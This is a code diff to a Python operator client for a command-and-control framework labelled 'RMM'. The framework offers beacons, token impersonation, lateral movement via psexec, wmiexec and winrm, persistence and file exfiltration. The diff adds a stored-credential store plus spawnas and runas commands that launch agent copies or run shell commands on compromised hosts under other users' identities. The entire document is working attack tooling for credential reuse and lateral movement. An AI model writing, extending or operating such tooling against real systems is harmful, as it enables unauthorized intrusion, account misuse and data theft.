@@ -73,6 +73,9 @@ RMM_CLI_COMMANDS = [
     "events",
     "exec",
     "spawn",
+    "spawnas",
+    "runas",
+    "creds",
     "make_token",
     "rev2self",
     "lateral",
@@ -257,6 +260,44 @@ class RmmApiClient:
             {"timeout": timeout},
             timeout=timeout + 5,
         )
+
+    # ── Credential store (workspace-scoped) ───────────────────────────────────
+
+    def creds_add(self, domain: str, user: str, password: str):
+        return self.request("POST", "/api/v1/creds",
+                            {"domain": domain, "user": user, "password": password})
+
+    def creds_del(self, cred_id: str):
+        return self.request("DELETE", f"/api/v1/creds/{cred_id}")
+
+    def creds_list(self):
+        return self.request("GET", "/api/v1/creds")
+
+    # ── Identity-aware process creation ───────────────────────────────────────
+
+    def spawnas(self, session_id: str, cred_id: str = "", domain: str = "",
+                user: str = "", password: str = "", verify: bool = True,
+                spawn_timeout: float = 120, register_timeout: float = 60,
+                verify_timeout: float = 120):
+        body: dict = {"verify": verify, "spawn_timeout": spawn_timeout,
+                      "register_timeout": register_timeout, "verify_timeout": verify_timeout}
+        if cred_id:
+            body["cred_id"] = cred_id
+        else:
+            body.update({"domain": domain, "user": user, "password": password})
+        return self.request("POST", f"/api/v1/sessions/{session_id}/spawnas", body,
+                            timeout=spawn_timeout + register_timeout + 2 * verify_timeout + 30)
+
+    def runas(self, session_id: str, command: str, cred_id: str = "",
+              domain: str = "", user: str = "", password: str = "",
+              timeout: float = 120):
+        body: dict = {"command": command, "timeout": timeout}
+        if cred_id:
+            body["cred_id"] = cred_id
+        else:
+            body.update({"domain": domain, "user": user, "password": password})
+        return self.request("POST", f"/api/v1/sessions/{session_id}/runas", body,
+                            timeout=timeout + 5)
 
     def patch_config(self, session_id: str, sleep_seconds=None, jitter_percent=None):
         body = {}
@@ -1012,6 +1053,104 @@ def cmd_rev2self(client: RmmApiClient, state: dict, args):
     say(data.get("output") or "token reverted")
 
 
+def cmd_creds_add(client: RmmApiClient, state: dict, args):
+    domain, user = split_identity(args.user)
+    if not user:
+        die("Missing user in identity (use DOMAIN\\user or user)", 1)
+    code, data = client.creds_add(domain, user, args.password)
+    if args.json:
+        print_json(data)
+        return
+    if code != 200:
+        die(f"creds add failed ({code}): {data.get('error') if isinstance(data, dict) else data}", 1)
+    say(f"stored {data.get('cred_id')} ({domain + chr(92) + user if domain else user})")
+
+
+def cmd_creds_del(client: RmmApiClient, state: dict, args):
+    code, data = client.creds_del(args.cred_id)
+    if args.json:
+        print_json(data)
+        return
+    if code not in (200, 404):
+        die(f"creds del failed ({code}): {data.get('error') if isinstance(data, dict) else data}", 1)
+    say(data.get("message") or ("deleted" if code == 200 else "not found"))
+
+
+def cmd_creds_list(client: RmmApiClient, state: dict, args):
+    code, data = client.creds_list()
+    if args.json:
+        print_json(data)
+        return
+    if code != 200:
+        die(f"creds list failed ({code})", 1)
+    creds = (data.get("credentials") or []) if isinstance(data, dict) else []
+    if not creds:
+        say("no credentials stored")
+        return
+    for c in creds:
+        identity = (c.get("domain") + "\\" + c.get("user")) if c.get("domain") else c.get("user", "?")
+        say(f"  {c.get('cred_id') or c.get('id')}  {identity}")
+
+
+def cmd_spawnas(client: RmmApiClient, state: dict, args):
+    sid = require_session(state, args.session)
+    cred_id = getattr(args, "cred_id", "") or ""
+    user = getattr(args, "user", "") or ""
+    domain = getattr(args, "domain", "") or ""
+    password = getattr(args, "password", "") or ""
+    if not cred_id and not user:
+        die("Provide a cred_id positional argument or --user", 1)
+    if not cred_id and domain == "" and "\\" in user:
+        domain, user = user.split("\\", 1)
+    verify = not getattr(args, "no_verify", False)
+    say("Spawning agent under new identity (waits for the next beacon and registration)...", err=True)
+    code, data = client.spawnas(sid, cred_id=cred_id, domain=domain, user=user,
+                                password=password, verify=verify,
+                                spawn_timeout=getattr(args, "spawn_timeout", 120),
+                                register_timeout=getattr(args, "register_timeout", 60),
+                                verify_timeout=getattr(args, "verify_timeout", 120))
+    if args.json:
+        print_json(data)
+        if code != 200 or (isinstance(data, dict) and not data.get("ok") and not data.get("pending")):
+            raise SystemExit(1)
+        return
+    if code != 200:
+        detail = data.get("error") if isinstance(data, dict) else data
+        die(f"spawnas failed ({code})" + (f": {detail}" if detail else ""), 1)
+    if isinstance(data, dict):
+        say(f"spawned session {data.get('spawned_session_id')} pid={data.get('spawn_pid')} identity={data.get('identity')}")
+        if data.get("verify"):
+            say(f"registered: {'yes' if data.get('registered') else 'no'}; "
+                f"parent responsive: {'yes' if data.get('parent_responsive') else 'no'}; "
+                f"spawned responsive: {'yes' if data.get('spawned_responsive') else 'no'}")
+            if not data.get("verified"):
+                warn("spawnas verification did not pass — inspect both sessions.")
+
+
+def cmd_runas(client: RmmApiClient, state: dict, args):
+    sid = require_session(state, args.session)
+    cred_id = getattr(args, "cred_id", "") or ""
+    user = getattr(args, "user", "") or ""
+    domain = getattr(args, "domain", "") or ""
+    password = getattr(args, "password", "") or ""
+    if not cred_id and not user:
+        die("Provide a cred_id positional argument or --user", 1)
+    if not cred_id and domain == "" and "\\" in user:
+        domain, user = user.split("\\", 1)
+    say("Running command under new identity (waits for the next beacon)...", err=True)
+    code, data = client.runas(sid, args.command, cred_id=cred_id, domain=domain,
+                              user=user, password=password,
+                              timeout=getattr(args, "timeout", 120))
+    if args.json:
+        print_json(data)
+        return
+    if code != 200:
+        detail = data.get("error") if isinstance(data, dict) else data
+        die(f"runas failed ({code})" + (f": {detail}" if detail else ""), 1)
+    for line in (data.get("output") or "").splitlines() or ["(no output)"]:
+        say(line)
+
+
 def cmd_lateral(client: RmmApiClient, state: dict, args):
     sid = require_session(state, args.session)
     say(f"Lateral {args.method} to {args.host} (waits for the next beacon)...", err=True)
@@ -1466,7 +1605,10 @@ def _show_help():
 Session:  /list | /use <id> | /info | /background | /kill [id]
 Beacon:   /set_sleep <seconds> | /set_jitter <percent> | /show_config
 Remote:   <command> or /run <command>  (queue) | /exec <command>  (wait) | /persist <cmd> | /stop
-Spawn:    /spawn [id]   (detached second Go agent, fresh session ID, verifies both sessions)
+Spawn:    /spawn [id]   (detached second Go agent, same identity)
+          /spawnas <cred_id>   (spawn under different identity, CreateProcessAsUser cascade)
+          /runas <cred_id> <command>   (run command under different identity)
+Creds:    /creds list | /creds add <domain\\user | user> <password> | /creds del <cred_id>
 Identity: /make_token <domain\\user | user> <password>  (runas /netonly style) | /rev2self | /uid
 Lateral:  /lateral <psexec|wmiexec|winrm> <host>   (start a Go agent on another host)
 Files:    /download <remote> | /exfil <remote> [profile] | /upload <local> <remote> | /screenshot
@@ -2066,6 +2208,94 @@ def run_interactive(
                     for line in (data.get("output") or "").splitlines() or ["(no output)"]:
                         say(line)
                 continue
+            if cmd == "creds":
+                sub_rest = rest
+                sub_cmd = sub_rest[0].lower() if sub_rest else ""
+                if sub_cmd == "list" or not sub_cmd:
+                    code, data = client.creds_list()
+                    if code != 200:
+                        warn(f"creds list failed ({code})")
+                    else:
+                        creds = (data.get("credentials") or []) if isinstance(data, dict) else []
+                        if not creds:
+                            say("no credentials stored")
+                        for c in creds:
+                            identity = (c.get("domain") + "\\" + c.get("user")) if c.get("domain") else c.get("user", "?")
+                            say(f"  {c.get('cred_id') or c.get('id')}  {identity}")
+                elif sub_cmd == "add":
+                    if len(sub_rest) < 3:
+                        warn("Usage: /creds add <domain\\user | user> <password>")
+                    else:
+                        try:
+                            cred_parts = parse_identity_arguments(" ".join(sub_rest[1:]))
+                        except ValueError:
+                            cred_parts = sub_rest[1:]
+                        if len(cred_parts) < 2:
+                            warn("Usage: /creds add <domain\\user | user> <password>")
+                        else:
+                            cred_domain, cred_user = split_identity(cred_parts[0])
+                            cred_password = cred_parts[1]
+                            code, data = client.creds_add(cred_domain, cred_user, cred_password)
+                            if code != 200:
+                                warn(f"creds add failed ({code}): {data.get('error') if isinstance(data, dict) else data}")
+                            else:
+                                cred_identity = (cred_domain + "\\" + cred_user) if cred_domain else cred_user
+                                say(f"stored {data.get('cred_id')} ({cred_identity})")
+                elif sub_cmd == "del":
+                    if len(sub_rest) < 2:
+                        warn("Usage: /creds del <cred_id>")
+                    else:
+                        code, data = client.creds_del(sub_rest[1])
+                        if code not in (200, 404):
+                            warn(f"creds del failed ({code}): {data.get('error') if isinstance(data, dict) else data}")
+                        else:
+                            say(data.get("message") or ("deleted" if code == 200 else "not found"))
+                else:
+                    warn("Usage: /creds list | /creds add <identity> <password> | /creds del <cred_id>")
+                continue
+            if cmd == "spawnas":
+                if not rest:
+                    warn("Usage: /spawnas <cred_id>")
+                    continue
+                sid = session_or_none(state)
+                if not sid:
+                    warn("No session selected")
+                    continue
+                cred_id = rest[0]
+                say("Spawning agent under new identity (waits for the next beacon and registration)...")
+                code, data = client.spawnas(sid, cred_id=cred_id)
+                if code != 200:
+                    detail = data.get("error") if isinstance(data, dict) else data
+                    warn(f"spawnas failed ({code})" + (f": {detail}" if detail else ""))
+                elif isinstance(data, dict):
+                    say(f"spawned session={data.get('spawned_session_id')} pid={data.get('spawn_pid')} identity={data.get('identity')}")
+                    if data.get("verify"):
+                        say(f"registered: {'yes' if data.get('registered') else 'no'}; "
+                            f"parent responsive: {'yes' if data.get('parent_responsive') else 'no'}; "
+                            f"spawned responsive: {'yes' if data.get('spawned_responsive') else 'no'}")
+                        if not data.get("verified"):
+                            warn("spawnas verification did not pass — inspect both sessions.")
+                    _refresh_completion_sessions(client, state)
+                continue
+            if cmd == "runas":
+                if len(rest) < 2:
+                    warn("Usage: /runas <cred_id> <command...>")
+                    continue
+                sid = session_or_none(state)
+                if not sid:
+                    warn("No session selected")
+                    continue
+                runas_cred_id = rest[0]
+                runas_command = " ".join(rest[1:])
+                say("Running command under new identity (waits for the next beacon)...")
+                code, data = client.runas(sid, runas_command, cred_id=runas_cred_id)
+                if code != 200:
+                    detail = data.get("error") if isinstance(data, dict) else data
+                    warn(f"runas failed ({code})" + (f": {detail}" if detail else ""))
+                else:
+                    for ln in (data.get("output") or "").splitlines() or ["(no output)"]:
+                        say(ln)
+                continue
             if cmd == "pe":
                 if rest and rest[0].lower() == "list":
                     code, data = client.list_plugins()
@@ -2531,6 +2761,46 @@ def build_parser() -> argparse.ArgumentParser:
     sp_rev.add_argument("--session", "-s", default=None)
     sp_rev.add_argument("--timeout", type=float, default=120, help="Seconds to wait for the agent result")
     sp_rev.set_defaults(func=cmd_rev2self)
+
+    sp_creds = sub.add_parser("creds", help="Manage workspace-scoped credentials")
+    sp_creds_sub = sp_creds.add_subparsers(dest="creds_cmd", required=True)
+    sp_creds_add_p = sp_creds_sub.add_parser("add", parents=[shared], help="Store a credential (returns cred_id)")
+    sp_creds_add_p.add_argument("user", help="Identity as DOMAIN\\user or plain user")
+    sp_creds_add_p.add_argument("password", help="Password")
+    sp_creds_add_p.set_defaults(func=cmd_creds_add)
+    sp_creds_del_p = sp_creds_sub.add_parser("del", parents=[shared], help="Remove a stored credential")
+    sp_creds_del_p.add_argument("cred_id", help="Credential ID")
+    sp_creds_del_p.set_defaults(func=cmd_creds_del)
+    sp_creds_list_p = sp_creds_sub.add_parser("list", parents=[shared], help="List stored credentials (no passwords)")
+    sp_creds_list_p.set_defaults(func=cmd_creds_list)
+
+    sp_spawnas = sub.add_parser(
+        "spawnas",
+        parents=[shared],
+        help="Spawn a Go agent copy under a different process identity (CreateProcessAsUser cascade)",
+    )
+    sp_spawnas.add_argument("cred_id", nargs="?", default="", help="Credential ID from 'creds add'")
+    sp_spawnas.add_argument("--user", default="", help="Identity as DOMAIN\\user or plain user (if no cred_id)")
+    sp_spawnas.add_argument("--password", default="", help="Password (if no cred_id)")
+    sp_spawnas.add_argument("--session", "-s", default=None)
+    sp_spawnas.add_argument("--no-verify", dest="no_verify", action="store_true")
+    sp_spawnas.add_argument("--spawn-timeout", type=float, default=120)
+    sp_spawnas.add_argument("--register-timeout", type=float, default=60)
+    sp_spawnas.add_argument("--verify-timeout", type=float, default=120)
+    sp_spawnas.set_defaults(func=cmd_spawnas)
+
+    sp_runas = sub.add_parser(
+        "runas",
+        parents=[shared],
+        help="Run a command on a Go agent under a different process identity",
+    )
+    sp_runas.add_argument("command", help="Shell command to execute")
+    sp_runas.add_argument("cred_id", nargs="?", default="", help="Credential ID from 'creds add'")
+    sp_runas.add_argument("--user", default="", help="Identity (if no cred_id)")
+    sp_runas.add_argument("--password", default="", help="Password (if no cred_id)")
+    sp_runas.add_argument("--session", "-s", default=None)
+    sp_runas.add_argument("--timeout", type=float, default=120)
+    sp_runas.set_defaults(func=cmd_runas)
 
     sp_lat = sub.add_parser(
         "lateral",
